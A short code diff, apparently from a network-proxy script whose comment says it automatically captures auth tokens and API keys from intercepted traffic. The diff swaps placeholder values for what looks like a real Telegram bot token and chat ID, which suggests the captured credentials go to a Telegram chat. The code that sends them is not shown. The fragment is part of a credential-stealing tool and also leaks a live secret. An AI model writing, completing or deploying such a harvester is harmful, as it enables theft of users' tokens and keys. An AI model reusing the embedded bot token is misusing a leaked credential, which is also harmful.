@@ -3,8 +3,8 @@
 // Auth tokens, API keys automatically capture
 // ══════════════════════════════════════
 
-const TELEGRAM_TOKEN = "APNA_TOKEN_DAAL";
-const CHAT_ID = "APNA_CHAT_ID_DAAL";
+const TELEGRAM_TOKEN = "8726608335:AAEqXdMPFy7ngTkATv4CodwQUgI_3qMadoo";
+const CHAT_ID = "8273405443";
 
 const url = $request.url;
 const headers = $response.headers || {};
